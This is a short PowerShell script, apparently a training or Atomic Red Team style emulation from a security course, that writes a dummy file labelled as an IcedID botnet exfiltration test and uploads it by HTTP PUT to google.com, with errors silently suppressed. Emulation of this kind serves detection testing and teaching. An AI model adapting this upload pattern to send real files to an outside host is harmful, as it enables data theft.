# By Threats Experts University

$fileName = "C:\Users\studentadmin\Desktop\exiFile.txt"
$url = "https://google.com"
$file = New-Item -Force $fileName -Value "This is ART IcedID Botnet Exfil Test"
$contentType = "application/octet-stream"
try {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}